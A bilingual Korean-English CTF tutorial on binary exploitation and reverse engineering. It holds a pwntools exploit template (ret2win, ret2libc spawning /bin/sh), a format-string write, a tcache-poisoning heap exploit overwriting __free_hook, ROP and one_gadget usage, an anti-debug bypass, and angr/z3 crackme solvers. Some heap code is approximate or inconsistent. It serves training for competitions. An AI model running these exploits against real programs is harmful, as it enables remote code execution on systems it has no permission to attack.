# PWN과 REV CTF 기법

PWN(바이너리 익스플로잇)과 REV(리버스 엔지니어링)는 CTF에서 가장 기술적인 분야다. pwntools를 이용한 완전한 익스플로잇 작성부터 angr/z3를 이용한 크랙미 자동화까지 실전 기법을 다룬다.

## 0. 초보자를 위한 개념 이해

### PWN과 REV란?

PWN(Pwnable)은 실행 파일(바이너리)의 메모리 취약점을 찾아 악용하는 CTF 분야다. 스택 오버플로우, 힙 오버플로우 등을 이용해 프로그램 흐름을 제어하고 쉘(명령 실행 권한)을 획득하는 것이 목표다. REV(Reverse Engineering)는 소스 코드 없이 실행 파일을 분석해 동작을 이해하거나 숨겨진 플래그를 찾는 분야다.

**왜 배우는가:**
```
PWN 공격 흐름:

  정상 프로그램:
    입력 버퍼(20바이트) → [데이터 | 리턴 주소]

  PWN 공격 (버퍼 오버플로우):
    긴 입력(100바이트) → [데이터AAAA... | [쉘 주소로 덮기!]]
                                                │
                                                ▼
                                         쉘(Shell) 획득
                                         → 플래그 파일 읽기

  REV 분석 흐름:
    바이너리 파일 → Ghidra 디컴파일 → 의사 C코드 →
    알고리즘 이해 → 역연산으로 플래그 계산
```

### 핵심 개념 정리

```
보호 기법 (checksec 결과 해석):

NX (No-Execute)
  - 스택/힙에서 코드 실행 불가
  - 우회: ROP(Return Oriented Programming) 체인

ASLR (Address Space Layout Randomization)
  - 라이브러리/스택 주소를 매 실행마다 무작위화
  - 우회: 주소 유출(leak) → 실제 주소 계산

Canary (스택 카나리)
  - 리턴 주소 앞에 랜덤 값 배치, 덮이면 종료
  - 우회: 카나리 값 유출 후 동일값으로 덮기

PIE (Position Independent Executable)
  - 실행 파일 자체도 무작위 주소에 로드
  - 우회: 바이너리 내 주소 유출

리버싱 핵심 도구:
  Ghidra   → NSA 제공 무료 디컴파일러 (C 코드로 복원)
  IDA Free → 강력한 디어셈블러 (무료 버전)
  GDB      → Linux 디버거 (pwndbg 플러그인 필수)
  angr     → Python 심볼릭 실행 엔진 (자동 풀이)
```

### 필요한 도구 및 환경
- **pwntools**: `pip install pwntools` — 바이너리 익스플로잇 프레임워크
- **GDB + pwndbg**: `git clone https://github.com/pwndbg/pwndbg && ./setup.sh`
- **Ghidra**: https://ghidra-sre.org — 무료 디컴파일러
- **ROPgadget**: `pip install ROPgadget` — ROP 가젯 검색
- **Docker**: 문제 환경과 동일한 libc 버전 맞추기 위해 필요

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""
PWN 입문: 간단한 버퍼 오버플로우 취약점 패턴 분석 도구
실제 CTF 문제 풀이 전 오프셋(offset) 계산 방법 시연
"""
import struct


def create_cyclic_pattern(length: int) -> bytes:
    """
    고유한 순환 패턴 생성 — 충돌 발생 시 어느 위치인지 파악용
    pwntools의 cyclic() 함수와 동일한 개념
    """
    charset = b"abcdefghijklmnopqrstuvwxyz"
    pattern = b""
    for i in range(length):
        # 4바이트 단위로 고유한 패턴 생성
        a = (i // (26 ** 0)) % 26
        b = (i // (26 ** 1)) % 26
        c = (i // (26 ** 2)) % 26
        d = (i // (26 ** 3)) % 26
        pattern += bytes([charset[a], charset[b], charset[c], charset[d]])[i % 4:i % 4 + 1]
    return pattern[:length]


def find_offset(crash_value: int, pattern_length: int = 200) -> int | None:
    """
    크래시 발생 시 RIP/EIP 레지스터 값으로 오프셋을 찾는다.
    GDB에서 크래시 시 'i r rip' 또는 'i r eip'로 값 확인
    """
    pattern = create_cyclic_pattern(pattern_length)
    crash_bytes = struct.pack("<I", crash_value & 0xFFFFFFFF)
    try:
        offset = pattern.index(crash_bytes)
        return offset
    except ValueError:
        return None


def demonstrate_bof_concept() -> None:
    """버퍼 오버플로우 기초 개념 시연"""
    print("[1단계] 순환 패턴 생성 (pwntools cyclic과 동일 개념)")
    pattern = create_cyclic_pattern(100)
    print(f"  패턴: {pattern[:40].decode('latin-1')}...")
    print(f"  길이: {len(pattern)} 바이트")

    print("\n[2단계] 실제 CTF PWN 문제 풀이 흐름:")
    print("  1. checksec ./binary                  # 보호 기법 확인")
    print("  2. python3 -c \"print('A'*200)\" | ./binary  # 크래시 유발")
    print("  3. GDB: run < <(python3 -c \"print('A'*200)\")  # 디버깅")
    print("  4. GDB 크래시 시 RIP 값 확인 (예: 0x6161616c)")
    print("  5. find_offset(0x6161616c) 로 오프셋 계산")
    print("  6. pwntools로 페이로드 작성 후 익스플로잇")

    print("\n[3단계] pwntools 페이로드 작성 템플릿:")
    print("""
  from pwn import *
  p = process("./binary")       # 로컬 바이너리 실행
  offset = 40                    # 위에서 찾은 오프셋
  ret_addr = 0x401234            # 이동할 함수 주소 (win function 등)
  payload = b"A" * offset + p64(ret_addr)
  p.sendline(payload)
  p.interactive()                # 쉘 획득 시 상호작용 모드
""")


if __name__ == "__main__":
    demonstrate_bof_concept()
    # 오프셋 찾기 예제
    example_crash = 0x6161616c  # 'laaa' in little-endian
    result = find_offset(example_crash)
    if result is not None:
        print(f"\n[오프셋 계산 결과]: {result} 바이트")
```

---

## 1. 보호 기법 이해

### 1.1 checksec 결과 해석

```bash
checksec --file=./binary

Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

| 보호 기법 | 설명 | 우회 방법 |
|---------|------|---------|
| ASLR | 런타임 주소 무작위화 | 정보 유출, 브루트포스 |
| PIE | 바이너리 자체 랜덤화 | 코드베이스 유출 후 계산 |
| NX/DEP | 스택/힙 실행 불가 | ROP 체인 |
| Stack Canary | 스택 오버플로우 탐지 | 카나리 유출, 브루트포스(포크) |
| RELRO Full | GOT 쓰기 불가 | __malloc_hook, __free_hook 등 |

---

## 2. pwntools 완전 익스플로잇 템플릿

```python
#!/usr/bin/env python3
"""pwntools CTF 익스플로잇 템플릿 — 실전 완성형"""

from pwn import *
import sys


# ── 바이너리·컨텍스트 설정 ───────────────────────────────
ELF_PATH = "./binary"
LIBC_PATH = "./libc.so.6"   # 제공된 libc (없으면 None)
HOST = "challenges.ctf.site"
PORT = 1337

context.binary = elf = ELF(ELF_PATH)
context.arch = 'amd64'
context.log_level = 'info'  # debug / info / warning

libc = ELF(LIBC_PATH) if LIBC_PATH else None


def get_io(target: str = "local") -> tube:
    """로컬/원격 전환"""
    if target == "remote":
        return remote(HOST, PORT)
    elif target == "gdb":
        return gdb.debug(ELF_PATH, gdbscript="""
            b main
            b *vuln+42
            continue
        """)
    else:
        return process(ELF_PATH)


# ── 유틸리티 ────────────────────────────────────────────
def p(x): return pack(x)   # 64비트 패킹
def u(x): return unpack(x) # 64비트 언패킹

def leak_addr(io: tube, offset: int = 0) -> int:
    """6바이트 주소 누출 (printf %s 형식)"""
    raw = io.recv(6)
    return u(raw.ljust(8, b'\x00')) + offset


# ── 익스플로잇 함수 ──────────────────────────────────────
def exploit_ret2win(io: tube) -> None:
    """ret2win: 바이너리 내 win() 함수로 리턴"""
    win = elf.symbols.get('win') or elf.symbols.get('flag')
    if not win:
        log.failure("win 함수를 찾을 수 없음")
        return

    # 스택 패딩 계산 (cyclic 패턴으로 오프셋 식별)
    # cyclic 패턴 생성: cyclic(200) → gdb에서 크래시 후 pattern offset 확인
    OFFSET = 72  # 실제 값으로 변경

    payload = flat(
        b'A' * OFFSET,
        elf.sym['ret'],  # 스택 정렬 (Ubuntu 18.04+)
        win,
    )
    io.sendlineafter(b"> ", payload)


def exploit_ret2libc(io: tube) -> None:
    """ret2libc: puts/printf로 libc 주소 누출 → system("/bin/sh")"""
    assert libc is not None, "libc.so.6 경로 필요"

    OFFSET = 72  # 실제 오프셋으로 변경
    rop = ROP(elf)

    # 가젯 탐색
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret_gadget = rop.find_gadget(['ret'])[0]

    # 1단계: puts(puts@GOT) → libc 주소 누출
    stage1 = flat(
        b'A' * OFFSET,
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main'],  # main으로 돌아가 2단계 진행
    )
    io.sendlineafter(b"> ", stage1)

    # libc 베이스 계산
    puts_leak = u(io.recv(6).ljust(8, b'\x00'))
    libc.address = puts_leak - libc.sym['puts']
    log.success(f"libc @ 0x{libc.address:016x}")

    # 2단계: system("/bin/sh")
    bin_sh = next(libc.search(b'/bin/sh'))
    stage2 = flat(
        b'A' * OFFSET,
        ret_gadget,           # 16바이트 정렬
        pop_rdi,
        bin_sh,
        libc.sym['system'],
    )
    io.sendlineafter(b"> ", stage2)


def exploit_format_string(io: tube) -> None:
    """포맷 스트링: 스택에서 주소 유출 또는 임의 쓰기"""
    # 오프셋 탐지: %1$p %2$p ... %30$p 전송 후 canary 위치 찾기
    for i in range(1, 50):
        io.sendlineafter(b"> ", f"%{i}$p".encode())
        try:
            val = int(io.recvline().strip(), 16)
            if val == 0x00007ffd:  # 스택 주소 접두어
                log.info(f"스택 주소 오프셋: {i}")
        except ValueError:
            pass

    # 임의 주소 쓰기: %<value>c%<offset>$n
    # target_addr = elf.got['puts']
    # payload = fmtstr_payload(offset, {target_addr: new_value})


def exploit_heap(io: tube) -> None:
    """힙 익스플로잇: tcache poisoning (glibc 2.35+)"""
    # tcache poisoning + safe-linking 우회
    # 1. 두 청크 할당
    # 2. 두 번째 청크 free → 세 번째 청크 free (이중 free)
    # 3. fd 포인터 덮어쓰기 (XOR 디맹글링 필요: glibc 2.32+)
    # 4. 원하는 주소 할당 → 덮어쓰기
    pass


# ── 메인 ────────────────────────────────────────────────
def main() -> None:
    target = sys.argv[1] if len(sys.argv) > 1 else "local"
    io = get_io(target)

    try:
        exploit_ret2libc(io)
        io.interactive()
    except EOFError:
        log.failure("연결 종료")
    finally:
        io.close()


if __name__ == "__main__":
    main()
```

---

## 3. ROP 체인 구성

### 3.1 ROPgadget으로 가젯 탐색

```bash
# 가젯 탐색
ROPgadget --binary ./binary --rop

# 특정 가젯 필터
ROPgadget --binary ./binary --rop | grep "pop rdi"

# 체인 자동 생성
ROPgadget --binary ./binary --rop --chain "execve"
```

### 3.2 pwntools ROP 클래스

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP([elf, libc])

# 자동 체인 구성
rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh'))])
print(rop.dump())
payload = flat(b'A' * 72, rop.chain())
```

---

## 4. 리버스 엔지니어링

### 4.1 안티디버깅 우회

```python
# ptrace 기반 anti-debug 우회 (LD_PRELOAD)
# ptrace.c
# int ptrace(int request, ...) { return 0; }
# 
# gcc -shared -fPIC ptrace.c -o fake_ptrace.so
# LD_PRELOAD=./fake_ptrace.so ./binary

# GDB에서 IsDebuggerPresent 우회
# (gdb) break IsDebuggerPresent
# (gdb) return 0

# pwndbg에서 타이밍 체크 우회
# (gdb) set {int}0x<rdtsc_call_addr> = 0x90909090
```

### 4.2 angr로 크랙미 자동화

```python
#!/usr/bin/env python3
"""angr 심볼릭 실행으로 크랙미 자동 풀기"""

import angr
import claripy
import sys


def solve_crackme(binary_path: str, flag_length: int = 32) -> str | None:
    """
    원리: angr가 모든 실행 경로를 심볼릭으로 탐색
    "Correct!" 출력 경로를 찾아 입력 값 역산
    """
    proj = angr.Project(binary_path, auto_load_libs=False)

    # 심볼릭 플래그 (알 수 없는 입력)
    flag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(flag_length)]
    flag = claripy.Concat(*flag_chars)

    # 초기 상태 (stdin으로 플래그 입력)
    state = proj.factory.full_init_state(
        stdin=angr.SimFile(content=flag, seekable=True)
    )

    # 제약 조건: 플래그는 출력 가능한 ASCII
    for c in flag_chars:
        state.solver.add(c >= 0x20)
        state.solver.add(c <= 0x7E)

    # 탐색 설정
    sm = proj.factory.simulation_manager(state)

    # 성공/실패 주소 설정
    # IDA/Ghidra에서 확인 후 주소 입력
    # find = proj.loader.main_object.min_addr + 0x1234  # "Correct!" 주소
    # avoid = proj.loader.main_object.min_addr + 0x1256  # "Wrong!" 주소
    
    # 또는 stdout 문자열 탐색
    sm.explore(
        find=lambda s: b"Correct" in s.posix.dumps(1),
        avoid=lambda s: b"Wrong" in s.posix.dumps(1),
    )

    if sm.found:
        found_state = sm.found[0]
        flag_value = found_state.solver.eval(flag, cast_to=bytes)
        return flag_value.decode('latin-1', errors='replace')

    return None


def solve_with_z3(conditions: list) -> str | None:
    """z3 SMT 솔버로 조건 만족하는 입력 찾기"""
    from z3 import Solver, BitVec, And, sat, simplify

    s = Solver()
    flag = [BitVec(f'x{i}', 8) for i in range(32)]

    # ASCII 제약
    for c in flag:
        s.add(c >= 0x20, c <= 0x7E)

    # 바이너리에서 추출한 조건 추가
    # 예시: flag[0] ^ flag[1] == 0x42
    # s.add(flag[0] ^ flag[1] == 0x42)
    # s.add(flag[0] + flag[2] == 0xAB)

    if s.check() == sat:
        model = s.model()
        return ''.join(chr(model[c].as_long()) for c in flag)

    return None


def main() -> None:
    import argparse
    parser = argparse.ArgumentParser(description="크랙미 자동 풀이 CLI")
    parser.add_argument("binary", help="크랙미 바이너리 경로")
    parser.add_argument("--length", type=int, default=32, help="플래그 길이")
    parser.add_argument("--tool", choices=["angr", "z3"], default="angr")

    args = parser.parse_args()

    print(f"[*] {args.tool}로 풀이 시작: {args.binary}")
    
    if args.tool == "angr":
        result = solve_crackme(args.binary, args.length)
    else:
        print("[!] z3 풀이는 조건 코드 수동 추가 필요")
        result = None

    if result:
        print(f"[+] 플래그: {result}")
    else:
        print("[-] 풀이 실패")


if __name__ == "__main__":
    main()
```

---

## 5. 힙 익스플로잇 기초

### 5.1 tcache poisoning (glibc 2.32+ safe-linking)

```python
from pwn import *

io = process('./heap_challenge')
libc = ELF('./libc.so.6')

def alloc(size: int, data: bytes) -> None:
    io.sendline(b'1')
    io.sendline(str(size).encode())
    io.sendline(data)

def free(idx: int) -> None:
    io.sendline(b'2')
    io.sendline(str(idx).encode())

def view(idx: int) -> bytes:
    io.sendline(b'3')
    io.sendline(str(idx).encode())
    return io.recvline()

# 1. 힙 주소 유출 (UAF 취약점 이용)
alloc(0x20, b'A' * 8)  # 청크 0
free(0)
heap_leak = u64(view(0)[:6].ljust(8, b'\x00'))

# 2. safe-linking 디맹글링 (glibc 2.32+)
# 실제 주소 = leaked ^ (heap_base >> 12)
heap_base = heap_leak << 12  # 대략적인 힙 베이스

# 3. tcache 포인터 조작 → __free_hook 덮어쓰기
target = libc.sym['__free_hook']
poisoned_fd = target ^ (heap_base >> 12)  # 맹글링 적용

alloc(0x20, b'B' * 8)   # 청크 0 재할당
alloc(0x20, b'C' * 8)   # 청크 1
free(1)
free(0)                  # tcache: 0 → 1
# fd 덮어쓰기
alloc(0x20, p64(poisoned_fd))
alloc(0x20, b'X' * 8)   # tcache에서 1 꺼내기
alloc(0x20, p64(libc.sym['system']))  # __free_hook = system

# 4. free("/bin/sh") → system("/bin/sh")
alloc(0x20, b'/bin/sh\x00')
free(7)
io.interactive()
```

---

## 6. one_gadget 활용

```bash
# libc 내 one_gadget RCE 가젯 탐색
one_gadget ./libc.so.6

# 출력 예시:
# 0x50a37 execve("/bin/sh", rsp+0x70, environ)
# constraints: rsp & 0xf == 0
# rax == NULL

# Python에서 사용
one_gadget = libc.address + 0x50a37
payload = flat(b'A' * offset, one_gadget)
```

---

<a name="english"></a>

# PWN and REV CTF Techniques

PWN (binary exploitation) and REV (reverse engineering) are the most technical categories in CTF competitions. This section covers practical techniques from writing complete exploits with pwntools to automating crackme solutions with angr/z3.

---

## 1. Understanding Protections

### 1.1 Interpreting checksec Output

```bash
checksec --file=./binary

Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

| Protection | Description | Bypass Method |
|---------|------|---------|
| ASLR | Runtime address randomization | Information leak, brute force |
| PIE | Binary itself randomized | Leak code base then calculate |
| NX/DEP | Stack/heap non-executable | ROP chain |
| Stack Canary | Stack overflow detection | Canary leak, brute force (fork) |
| RELRO Full | GOT not writable | __malloc_hook, __free_hook, etc. |

---

## 2. Complete pwntools Exploit Template

```python
#!/usr/bin/env python3
"""pwntools CTF exploit template — production-ready"""

from pwn import *
import sys


# ── Binary/context setup ───────────────────────────────
ELF_PATH = "./binary"
LIBC_PATH = "./libc.so.6"   # Provided libc (None if not available)
HOST = "challenges.ctf.site"
PORT = 1337

context.binary = elf = ELF(ELF_PATH)
context.arch = 'amd64'
context.log_level = 'info'  # debug / info / warning

libc = ELF(LIBC_PATH) if LIBC_PATH else None


def get_io(target: str = "local") -> tube:
    """Switch between local/remote"""
    if target == "remote":
        return remote(HOST, PORT)
    elif target == "gdb":
        return gdb.debug(ELF_PATH, gdbscript="""
            b main
            b *vuln+42
            continue
        """)
    else:
        return process(ELF_PATH)


# ── Utilities ────────────────────────────────────────────
def p(x): return pack(x)   # 64-bit pack
def u(x): return unpack(x) # 64-bit unpack

def leak_addr(io: tube, offset: int = 0) -> int:
    """Leak 6-byte address (printf %s format)"""
    raw = io.recv(6)
    return u(raw.ljust(8, b'\x00')) + offset


# ── Exploit functions ──────────────────────────────────────
def exploit_ret2win(io: tube) -> None:
    """ret2win: return to win() function in binary"""
    win = elf.symbols.get('win') or elf.symbols.get('flag')
    if not win:
        log.failure("Cannot find win function")
        return

    # Calculate stack padding (identify offset with cyclic pattern)
    # Generate cyclic pattern: cyclic(200) → check crash in gdb with pattern offset
    OFFSET = 72  # Change to actual value

    payload = flat(
        b'A' * OFFSET,
        elf.sym['ret'],  # Stack alignment (Ubuntu 18.04+)
        win,
    )
    io.sendlineafter(b"> ", payload)


def exploit_ret2libc(io: tube) -> None:
    """ret2libc: leak libc address via puts/printf → system("/bin/sh")"""
    assert libc is not None, "libc.so.6 path required"

    OFFSET = 72  # Change to actual offset
    rop = ROP(elf)

    # Find gadgets
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret_gadget = rop.find_gadget(['ret'])[0]

    # Stage 1: puts(puts@GOT) → leak libc address
    stage1 = flat(
        b'A' * OFFSET,
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main'],  # Return to main for stage 2
    )
    io.sendlineafter(b"> ", stage1)

    # Calculate libc base
    puts_leak = u(io.recv(6).ljust(8, b'\x00'))
    libc.address = puts_leak - libc.sym['puts']
    log.success(f"libc @ 0x{libc.address:016x}")

    # Stage 2: system("/bin/sh")
    bin_sh = next(libc.search(b'/bin/sh'))
    stage2 = flat(
        b'A' * OFFSET,
        ret_gadget,           # 16-byte alignment
        pop_rdi,
        bin_sh,
        libc.sym['system'],
    )
    io.sendlineafter(b"> ", stage2)


def exploit_format_string(io: tube) -> None:
    """Format string: leak address from stack or arbitrary write"""
    # Detect offset: send %1$p %2$p ... %30$p then find canary position
    for i in range(1, 50):
        io.sendlineafter(b"> ", f"%{i}$p".encode())
        try:
            val = int(io.recvline().strip(), 16)
            if val == 0x00007ffd:  # Stack address prefix
                log.info(f"Stack address offset: {i}")
        except ValueError:
            pass

    # Arbitrary write: %<value>c%<offset>$n
    # target_addr = elf.got['puts']
    # payload = fmtstr_payload(offset, {target_addr: new_value})


def exploit_heap(io: tube) -> None:
    """Heap exploit: tcache poisoning (glibc 2.35+)"""
    # tcache poisoning + safe-linking bypass
    # 1. Allocate two chunks
    # 2. Free second chunk → free third chunk (double free)
    # 3. Overwrite fd pointer (XOR demangling required: glibc 2.32+)
    # 4. Allocate target address → overwrite
    pass


# ── Main ────────────────────────────────────────────────
def main() -> None:
    target = sys.argv[1] if len(sys.argv) > 1 else "local"
    io = get_io(target)

    try:
        exploit_ret2libc(io)
        io.interactive()
    except EOFError:
        log.failure("Connection closed")
    finally:
        io.close()


if __name__ == "__main__":
    main()
```

---

## 3. ROP Chain Construction

### 3.1 Finding Gadgets with ROPgadget

```bash
# Find gadgets
ROPgadget --binary ./binary --rop

# Filter specific gadget
ROPgadget --binary ./binary --rop | grep "pop rdi"

# Auto-generate chain
ROPgadget --binary ./binary --rop --chain "execve"
```

### 3.2 pwntools ROP Class

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP([elf, libc])

# Automatic chain construction
rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh'))])
print(rop.dump())
payload = flat(b'A' * 72, rop.chain())
```

---

## 4. Reverse Engineering

### 4.1 Anti-Debugging Bypass

```python
# Anti-debug bypass via ptrace (LD_PRELOAD)
# ptrace.c
# int ptrace(int request, ...) { return 0; }
# 
# gcc -shared -fPIC ptrace.c -o fake_ptrace.so
# LD_PRELOAD=./fake_ptrace.so ./binary

# GDB: bypass IsDebuggerPresent
# (gdb) break IsDebuggerPresent
# (gdb) return 0

# pwndbg: bypass timing check
# (gdb) set {int}0x<rdtsc_call_addr> = 0x90909090
```

### 4.2 Automating Crackme with angr

```python
#!/usr/bin/env python3
"""Solve crackme automatically with angr symbolic execution"""

import angr
import claripy
import sys


def solve_crackme(binary_path: str, flag_length: int = 32) -> str | None:
    """
    Principle: angr symbolically explores all execution paths
    Finds the path that outputs "Correct!" and reverses the input
    """
    proj = angr.Project(binary_path, auto_load_libs=False)

    # Symbolic flag (unknown input)
    flag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(flag_length)]
    flag = claripy.Concat(*flag_chars)

    # Initial state (flag as stdin input)
    state = proj.factory.full_init_state(
        stdin=angr.SimFile(content=flag, seekable=True)
    )

    # Constraint: flag is printable ASCII
    for c in flag_chars:
        state.solver.add(c >= 0x20)
        state.solver.add(c <= 0x7E)

    # Exploration setup
    sm = proj.factory.simulation_manager(state)

    # Set success/failure addresses
    # Check in IDA/Ghidra then enter address
    # find = proj.loader.main_object.min_addr + 0x1234  # "Correct!" address
    # avoid = proj.loader.main_object.min_addr + 0x1256  # "Wrong!" address
    
    # Or search by stdout string
    sm.explore(
        find=lambda s: b"Correct" in s.posix.dumps(1),
        avoid=lambda s: b"Wrong" in s.posix.dumps(1),
    )

    if sm.found:
        found_state = sm.found[0]
        flag_value = found_state.solver.eval(flag, cast_to=bytes)
        return flag_value.decode('latin-1', errors='replace')

    return None


def solve_with_z3(conditions: list) -> str | None:
    """Find input satisfying conditions using z3 SMT solver"""
    from z3 import Solver, BitVec, And, sat, simplify

    s = Solver()
    flag = [BitVec(f'x{i}', 8) for i in range(32)]

    # ASCII constraints
    for c in flag:
        s.add(c >= 0x20, c <= 0x7E)

    # Add conditions extracted from binary
    # Example: flag[0] ^ flag[1] == 0x42
    # s.add(flag[0] ^ flag[1] == 0x42)
    # s.add(flag[0] + flag[2] == 0xAB)

    if s.check() == sat:
        model = s.model()
        return ''.join(chr(model[c].as_long()) for c in flag)

    return None


def main() -> None:
    import argparse
    parser = argparse.ArgumentParser(description="Crackme auto-solver CLI")
    parser.add_argument("binary", help="Path to crackme binary")
    parser.add_argument("--length", type=int, default=32, help="Flag length")
    parser.add_argument("--tool", choices=["angr", "z3"], default="angr")

    args = parser.parse_args()

    print(f"[*] Starting solve with {args.tool}: {args.binary}")
    
    if args.tool == "angr":
        result = solve_crackme(args.binary, args.length)
    else:
        print("[!] z3 solve requires manual condition code addition")
        result = None

    if result:
        print(f"[+] Flag: {result}")
    else:
        print("[-] Solve failed")


if __name__ == "__main__":
    main()
```

---

## 5. Heap Exploitation Basics

### 5.1 tcache poisoning (glibc 2.32+ safe-linking)

```python
from pwn import *

io = process('./heap_challenge')
libc = ELF('./libc.so.6')

def alloc(size: int, data: bytes) -> None:
    io.sendline(b'1')
    io.sendline(str(size).encode())
    io.sendline(data)

def free(idx: int) -> None:
    io.sendline(b'2')
    io.sendline(str(idx).encode())

def view(idx: int) -> bytes:
    io.sendline(b'3')
    io.sendline(str(idx).encode())
    return io.recvline()

# 1. Leak heap address (using UAF vulnerability)
alloc(0x20, b'A' * 8)  # chunk 0
free(0)
heap_leak = u64(view(0)[:6].ljust(8, b'\x00'))

# 2. Safe-linking demangling (glibc 2.32+)
# actual_addr = leaked ^ (heap_base >> 12)
heap_base = heap_leak << 12  # approximate heap base

# 3. Manipulate tcache pointer → overwrite __free_hook
target = libc.sym['__free_hook']
poisoned_fd = target ^ (heap_base >> 12)  # apply mangling

alloc(0x20, b'B' * 8)   # reallocate chunk 0
alloc(0x20, b'C' * 8)   # chunk 1
free(1)
free(0)                  # tcache: 0 → 1
# overwrite fd
alloc(0x20, p64(poisoned_fd))
alloc(0x20, b'X' * 8)   # pop 1 from tcache
alloc(0x20, p64(libc.sym['system']))  # __free_hook = system

# 4. free("/bin/sh") → system("/bin/sh")
alloc(0x20, b'/bin/sh\x00')
free(7)
io.interactive()
```

---

## 6. Using one_gadget

```bash
# Find one_gadget RCE gadgets in libc
one_gadget ./libc.so.6

# Sample output:
# 0x50a37 execve("/bin/sh", rsp+0x70, environ)
# constraints: rsp & 0xf == 0
# rax == NULL

# Usage in Python
one_gadget = libc.address + 0x50a37
payload = flat(b'A' * offset, one_gadget)
```
